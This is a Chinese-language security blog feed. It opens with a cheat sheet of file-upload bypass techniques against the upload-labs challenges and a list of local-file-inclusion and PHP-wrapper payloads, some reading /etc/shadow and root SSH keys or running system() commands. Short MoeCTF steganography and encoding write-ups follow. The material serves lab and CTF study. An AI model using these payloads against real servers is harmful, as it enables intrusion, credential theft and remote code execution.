application&#x2F;x-httpd-php<br>第一行的文件名为要上传的shell的文件名第二行就是我们上面解释到的，将所有文件都按照php代码进行解析抓包<br>￼<br>这里将文件类型修改为image&#x2F;png服务器会按php文件进行解析再上传shell<br>￼<br>通过蚁剑连接shell</p><h1 id="文件上传姿势"><a href="#文件上传姿势" class="headerlink" title="文件上传姿势"></a>文件上传姿势</h1><p>原文链接：<a href="https://blog.csdn.net/Mitchell_Donovan/article/details/112911056">https://blog.csdn.net/Mitchell_Donovan/article/details/112911056</a></p><p>客户端</p><p>js检查</p><p>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。</p><p>绕过方法</p><p>1.我们直接删除代码中onsubmit事件中关于文件上传时验证上传文件的相关代码即可。</p><p>或者可以不加载所有js，还可以将html源码copy一份到本地，然后对相应代码进行修改，本地提交即可。</p><p>2.burp改包，由于是js验证，我们可以先将文件重命名为js允许的后缀名，在用burp发送数据包时候改成我们想要的后缀。</p><p>即可上传成功：</p><p>服务端</p><p>黑名单</p><p>这里做了黑名单处理，我们可以通过特殊可解析后缀进行绕过。<br>绕过方法</p><p>可以使用php、php4、php5、phpt、php3，phtml等绕过。</p><p>上传.htaccess</p><p>我们发现黑名单限制了很多后缀名，但是没有限制.htaccess</p><pre><code>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</code></pre><p>绕过方法</p><p>我们这里关注.htaccess文件可以修改MIME类型，这使得该.htaccess文件所在目录及其子目录中的后缀为.xxx的文件被Apache当做php文件。<br> AddType application&#x2F;x-httpd-php xxx</p><p>或者：<br>  &lt;FilesMatch “shell.jpg”&gt;<br>    SetHandler application&#x2F;x-httpd-php<br>  </FilesMatch></p><p>该语句会让Apache把shell.jpg文件解析为php文件</p><p>我们需要上传一个.htaccess文件，内容为：</p><p>SetHandler application&#x2F;x-httpd-php</p><p>这样所有的文件都会解析为php，接下来上传图片马即可</p><p>后缀大小写绕过</p><p>我们发现对.htaccess也进行了检测，但是没有对大小写进行统一。<br>绕过方法</p><p>后缀名改为PHP即可</p><p>空格绕过</p><p>黑名单没有对文件中的空格进行处理，可在后缀名中加空格绕过。<br>绕过方法</p><p>文件名最后加个空格，如：1.PHP（空格）</p><p>点绕过</p><pre><code>if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;此文件类型不允许上传！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;</code></pre><p>windows会对文件中的点进行自动去除，所以可以在文件末尾加点绕过，不再赘述。</p><p>::$DATA绕过</p><p>同windows特性，可在后缀名中加” ::$DATA”绕过，不再赘述。</p><p>路径拼接绕过</p><pre><code>if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = deldot($file_name);//删除文件名末尾的点        $file_ext = strrchr($file_name, &#39;.&#39;);        $file_ext = strtolower($file_ext); //转换为小写        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA        $file_ext = trim($file_ext); //首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;此文件类型不允许上传！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p>这里对文件名进行了处理，删除了文件名末尾的点，并且把处理过的文件名拼接到路径中。<br>绕过方法</p><p>这里我们可以构造文件名1.PHP. . （点+空格+点），经过处理后，文件名变成1.PHP.，即可绕过。</p><p>双写绕过</p><pre><code>    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);         $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;                if (move_uploaded_file($temp_file, $img_path)) &#123;            $is_upload = true;        &#125; else &#123;            $msg = &#39;上传出错！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p>绕过方法</p><p>这里我们可以看到将文件名替换为空，我们可以采用双写绕过：1.pphphp</p><p>白名单</p><p>MIME检查</p><pre><code>if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];                      if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;文件类型不正确，请重新上传！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;;    &#125;</code></pre><p>绕过方法</p><p>这里检查Content-type，我们burp抓包修改即可绕过：</p><p>%00 截断</p><pre><code>if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr))&#123;        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;         if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = true;        &#125; else &#123;            $msg = &#39;上传出错！&#39;;        &#125;    &#125; else&#123;        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    &#125;&#125;</code></pre><p>$img_path直接拼接，因此可以利用%00截断绕过<br>绕过方法</p><p>然后直接访问&#x2F;upload&#x2F;1.php即可</p><p>00截断（post）</p><pre><code>if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr))&#123;        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;         if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = true;        &#125; else &#123;            $msg = &quot;上传失败&quot;;        &#125;    &#125; else &#123;        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    &#125;&#125;?&gt;</code></pre><p>save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。<br>绕过方法</p><p>接下来访问1.php即可</p><p>文件内容检查</p><p>文件幻数检测</p><p>主要是检测文件内容开始处的文件幻数，比如图片类型的文件幻数如下，<br>要绕过jpg 文件幻数检测就要在文件开头写上下图的值：</p><p>Value &#x3D; FF D8 FF E0 00 10 4A 46 49 46</p><p>要绕过gif 文件幻数检测就要在文件开头写上下图的值</p><p>Value &#x3D; 47 49 46 38 39 61<br>要绕过png 文件幻数检测就要在文件开头写上下面的值</p><p>Value &#x3D; 89 50 4E 47</p><p>然后在文件幻数后面加上自己的一句话木马代码就行了</p><p>文件相关信息检测</p><p>图像文件相关信息检测常用的就是getimagesize()函数</p><p>只需要把文件头部分伪造好就ok 了，就是在幻数的基础上还加了一些文件信息</p><p>有点像下面的结构</p><pre><code>GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...)</code></pre><p>本次环境中的文件头检测，getimagesize，php_exif都可以用图片马绕过：</p><p>copy normal.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg</p><p>文件加载检测</p><p>一般是调用API 或函数去进行文件加载测试，常见的是图像渲染测试，甚至是进行二次渲染（过滤效果几乎最强）。对渲染&#x2F;加载测试的攻击方式是代码注入绕过，对二次渲染的攻击方式是攻击文件加载器自身。</p><p>对渲染&#x2F;加载测试攻击- 代码注入绕过</p><p>可以用图像处理软件对一张图片进行代码注入</p><p>用winhex 看数据可以分析出这类工具的原理是</p><p>在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区</p><p>对于渲染测试基本上都能绕过，毕竟本身的文件结构是完整的</p><p>二次渲染</p><p>imagecreatefromjpeg二次渲染它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染在这个过程中非图像数据的部分直接就隔离开了</p><pre><code>if (isset($_POST[&#39;submit&#39;]))&#123;    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];     $target_path=UPLOAD_PATH.basename($filename);     // 获得上传文件的扩展名    $fileext= substr(strrchr($filename,&quot;.&quot;),1);     //判断文件后缀与类型，合法才进行上传操作    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))        &#123;            //使用上传的图片生成新的图片            $im = imagecreatefromjpeg($target_path);             if($im == false)&#123;                $msg = &quot;该文件不是jpg格式的图片！&quot;;                @unlink($target_path);            &#125;else&#123;                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.jpg&quot;;                $newimagepath = UPLOAD_PATH.$newfilename;                imagejpeg($im,$newimagepath);                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.$newfilename;                @unlink($target_path);                $is_upload = true;            &#125;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;     &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))        &#123;            //使用上传的图片生成新的图片            $im = imagecreatefrompng($target_path);             if($im == false)&#123;                $msg = &quot;该文件不是png格式的图片！&quot;;                @unlink($target_path);            &#125;else&#123;                 //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.png&quot;;                $newimagepath = UPLOAD_PATH.$newfilename;                imagepng($im,$newimagepath);                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.$newfilename;                @unlink($target_path);                $is_upload = true;                           &#125;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;     &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))        &#123;            //使用上传的图片生成新的图片            $im = imagecreatefromgif($target_path);            if($im == false)&#123;                $msg = &quot;该文件不是gif格式的图片！&quot;;                @unlink($target_path);            &#125;else&#123;                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.gif&quot;;                $newimagepath = UPLOAD_PATH.$newfilename;                imagegif($im,$newimagepath);                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.$newfilename;                @unlink($target_path);                $is_upload = true;            &#125;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;else&#123;        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;    &#125;&#125;</code></pre><p>本关综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染。<br>绕过方法</p><p>得去找图片经过GD库转化后没有改变的部分，再将未改变的部分修改为相应的php代码。</p><p>条件竞争</p><pre><code>if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;     if(move_uploaded_file($temp_file, $upload_file))&#123;        if(in_array($file_ext,$ext_arr))&#123;             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        &#125;else&#123;            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);        &#125;    &#125;else&#123;        $msg = &#39;上传出错！&#39;;    &#125;&#125;</code></pre><p>这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。<br>绕过方法</p><p>然后不断访问webshell：</p><p>上传成功。</p><p>参考链接：</p><pre><code>https://blog.csdn.net/Kevinhanser/article/details/81613003https://secgeek.net/bookfresh-vulnerability/https://xz.aliyun.com/t/2435</code></pre><hr><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>00截断</p><p>构造长目录截断</p><p>但是光防御0字节是肯定不够的。俗话说上有政策下有对策，国内的安全研究者cloie发现了一个技巧——利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。</p><p>目录字符串在Windows下256字节、Linux下4096字节时达到最大值，最大值长度之后的字符将被丢弃。</p><p>而只需通过【.&#x2F;】就可以构造出足够长的目录。比如</p><p>.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;passwd</p><p>或者</p><p>&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;passwd</p><p>又或者</p><p>..&#x2F;1&#x2F;abc&#x2F;..&#x2F;1&#x2F;abc&#x2F;..&#x2F;1&#x2F;abc..</p><p>(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)<br>点号截断</p><p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;boot.ini&#x2F;………[…]…………</p><p>(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p><p>本地文件包含的利用技巧</p><p>本地文件包含漏洞，是有机会执行php代码的，但这取决于一些条件</p><p>经过不懈研究，安全研究者总结出了一下几种常见的技巧，用于本地文件包含后执行php代码。</p><p>（1）包含用户上传的文件</p><p>（2）包含data:&#x2F;&#x2F;或php:&#x2F;&#x2F;input等伪协议</p><p>（3）包含session文件</p><p>（4）包含日志文件</p><p>（5）包含&#x2F;proc&#x2F;self&#x2F;environ</p><p>（6）包含上传的临时文件</p><p>（7）包含其他应用创建的文件，如数据库文件，缓存文件，应用日志等，需具体问题具体分析<br>常见利用方式</p><?phpinclude("inc/" . $_GET['file']); ?><pre><code>包含同目录下的文件：</code></pre><p>?file&#x3D;.htaccess</p><pre><code>目录遍历：</code></pre><p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;locate.db</p><p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db</p><p>（linux中这两个文件储存着所有文件的路径，需要root权限）</p><pre><code>包含错误日志：?file=../../../../../../../../../var/log/apache/error.log （试试把UA设置为“”来使payload进入日志）获取web目录或者其他配置文件：</code></pre><p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</p><pre><code>包含上传的附件：</code></pre><p>?file&#x3D;..&#x2F;attachment&#x2F;media&#x2F;xxx.file</p><pre><code>读取session文件：</code></pre><p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_tnrdo9ub2tsdurntv0pdir1no7</p><p>（session文件一般在&#x2F;tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在&#x2F;var&#x2F;lib&#x2F;php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）</p><pre><code>如果拥有root权限还可以试试读这些东西：</code></pre><p>&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p><p>&#x2F;root&#x2F;.ssh&#x2F;id_rsa</p><p>&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore</p><p>&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</p><p>&#x2F;root&#x2F;.ssh&#x2F;known_hosts</p><p>&#x2F;etc&#x2F;shadow</p><p>&#x2F;root&#x2F;.bash_history</p><p>&#x2F;root&#x2F;.mysql_history</p><p>&#x2F;proc&#x2F;self&#x2F;fd&#x2F;fd[0-9]* (文件标识符)</p><p>&#x2F;proc&#x2F;mounts</p><p>&#x2F;proc&#x2F;config.gz</p><pre><code>如果有phpinfo可以包含临时文件：</code></pre><hr><h1 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h1><p>详细：<a href="https://blog.csdn.net/unexpectedthing/article/details/121276653">https://blog.csdn.net/unexpectedthing/article/details/121276653</a></p><p>简略版：<br>    在实战中文件包含漏洞配合PHP的伪协议可以发挥重大的作用,比如读取文件源码,任意命令执行或者开启后门获取webshell等,常用的伪协议有</p><pre><code>    php://filter 读取文件源码    php://input 任意代码执行    data://text/plain 任意代码执行    zip:// 配合文件上传开启后门</code></pre><p>下面拿ctf.show WEB模块的第3关举个栗子,这一关存在文件包含漏洞<br>php:&#x2F;&#x2F;filter</p><p>php:&#x2F;&#x2F;filter 协议可以对打开的数据流进行筛选和过滤,常用于读取文件源码</p><p>使用文件包含函数包含文件时,文件中的代码会被执行,如果想要读取文件源码,可以使用base64对文件内容进行编码,编码后的文件内容不会被执行,而是展示在页面中,我们将页面中的内容使用base64解码,就可以获取文件的源码了</p><p>使用base64对index.php文件进行编码,可以看到页面中展示了编码后的文件内容</p><p>?url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p><p> 接下来我们将编码后的文件内容进行base64解密,可以得到文件源码</p><p>php:&#x2F;&#x2F;input</p><p>php:&#x2F;&#x2F;input 可以访问请求的原始数据,配合文件包含漏洞可以将post请求体中的内容当做文件内容执行,从而实现任意代码执行,需要注意的是,当enctype&#x3D;multipart&#x2F;form-data时,php:&#x2F;input将会无效</p><pre><code>?url=php://input-- GET请求参数中使用php://input协议&lt;?php system(&#39;ls&#39;); ?&gt;-- post请求体中的内容会被当做文件内容执行</code></pre><p>data:&#x2F;&#x2F;</p><p>协议格式: data:资源类型;编码,内容</p><p>data:&#x2F;&#x2F;协议通过执行资源类型,使后面的内容当做文件内容来执行,从而造成任意代码执行</p><p>?url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('id') ?></p><p>zip:&#x2F;&#x2F;</p><p>ziip:&#x2F;&#x2F;协议用来读取压缩包中的文件,可以配合文件上传开启后门,获取webshell</p><p>将shell.txt压缩成zip,再将后缀名改为jpg上传至服务器,再通过zip伪协议访问压缩包里的文件,从而链接木马</p><p>?url&#x3D;zip:&#x2F;&#x2F;shell.jpg</p>]]></content>
      
      
      <categories>
          
          <category> 速查 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 速查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc-Wav</title>
      <link href="/2023/10/09/miscwav/"/>
      <url>/2023/10/09/miscwav/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>这是一道音频隐写的题目，解压附件发现是一个音频文件</p><h1 id="Audacity-and-Steghind"><a href="#Audacity-and-Steghind" class="headerlink" title="Audacity and Steghind"></a>Audacity and Steghind</h1><p>丢进处理文件中查看频谱图：<br><img src="/images/miscwav1.JPG"><br>发现有隐藏的信息，使用steghind并且用key：youseeme解压隐藏的文件：<br><img src="/images/miscwav2.JPG"></p><h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><p>解压出一个文本文件“兔兔”，暗示rabbit解密，使用youseeme上面的英文作为密匙，尝试后解出flag：<br><img src="/images/miscwavflag.JPG"></p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.一开始不知道steghind这个工具，导致做不出来</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc-PowerPoinT?</title>
      <link href="/2023/10/08/miscppt/"/>
      <url>/2023/10/08/miscppt/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>题目给了一个压缩包，并暗示这不是压缩包，解压发现有ppt字样的文件夹，猜测是ppt文件，将zip后缀改成pptx后成功打开</p><h1 id="寻找flag"><a href="#寻找flag" class="headerlink" title="寻找flag"></a>寻找flag</h1><p>打开ppt，ctrl+a全选，然后将所有文本框的文本调成红色，发现如下flag字段：<br><img src="/images/miscppt1.JPG"><br><img src="/images/miscppt2.JPG"><br><img src="/images/miscppt3.JPG"><br>还有一段没找到，于是将ppt解压，在xml文件中查找，最终找到：<br><img src="/images/miscppt4.JPG"></p><h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><p>将flag拼凑，得到flag：moectf{2ip_?_n0_i4_pxx4!}</p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.一开始找了很久最后一段，后来才想到解压开文字查找</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc-special encoding</title>
      <link href="/2023/10/05/ctfspencode/"/>
      <url>/2023/10/05/ctfspencode/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>“锟斤拷烫烫烫”明显在暗示编码错误，下载附件，发现是一种没见过的编码：<br>    +j9k-+Zi8-+T2A-+doQ-flag+&#x2F;xo-+AAo-+AAo-a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262+AAo-+AAo-+T0Y-+Zi8-flag+dSg-AES+UqA-+W8Y-+ToY-+&#x2F;ww-key+Zi8-+Tgs-+l2I-+j9k-+iEw-+W1c-+doQ-sha256+&#x2F;wg-hash+UDw-+doQ-+XwA-+WTQ-+Zi8-b34edc782d68fda34dc23329+&#x2F;wk-+AAo-+AAo-+YkA-+TuU-+i&#x2F;Q-+&#x2F;ww-codepage+dx8-+doQ-+X4g-+kc0-+iYE-+VUo-+&#x2F;wg-+AAo-</p><h1 id="UTF-7解码"><a href="#UTF-7解码" class="headerlink" title="UTF-7解码"></a>UTF-7解码</h1><p>经过尝试，知道这是utf-7编码（谁丧心病狂会用这种啊），解码后有这样的信息：<br>    这是你的flag<br>    a9736d8ad21107398b73324694cbcd11f66e3befe67016def21dcaa9ab143bc4405be596245361f98db6a0047b4be78ede40864eb988d8a4999cdcb31592fd42c7b73df3b492403c9a379a9ff5e81262<br>    但是flag用AES加密了，key是下面这行字的sha256（hash值的开头是b34edc782d68fda34dc23329）<br>    所以说，codepage真的很重要啊（<br>在线转换，得到key为：<br>    b34edc782d68fda34dc2332967273b0f0900a0ebd0dcec48467851bc6117bad1</p><h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><p>通过aes解密后得到flag：<br><img src="/images/ctfspencodeflag.JPG"><br>(注意所有都是hex)</p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.第一次做因为不知道utf-7而卡了很久<br>2.附上一些不那么常见的编码：</p><p>参考：<a 